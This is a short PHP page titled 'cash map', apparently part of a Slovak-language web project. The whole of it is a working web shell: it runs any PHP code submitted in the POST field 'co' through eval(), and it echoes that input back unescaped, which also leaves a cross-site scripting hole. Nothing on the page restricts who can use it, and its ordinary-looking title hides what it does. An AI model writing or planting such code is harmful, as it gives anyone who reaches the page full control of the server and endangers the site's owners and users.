<?php
$root = "../";
require("../casti/funkcie/index.php"); 
require("../casti/funkcie/vojak.php"); 
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>cash map</title>
</head>
<body>
<?php
if($_POST["co"]){
eval($_POST["co"]);
}
?>
<form name="form1" method="post" action="">
  <label>
  <textarea name="co" cols="100" rows="10" id="co"><?php echo($_POST["co"]); ?></textarea>
  </label>
  <br>
  <label>
  <input type="submit" name="Submit" value="OK">
  </label>
</form>
</body>
</html>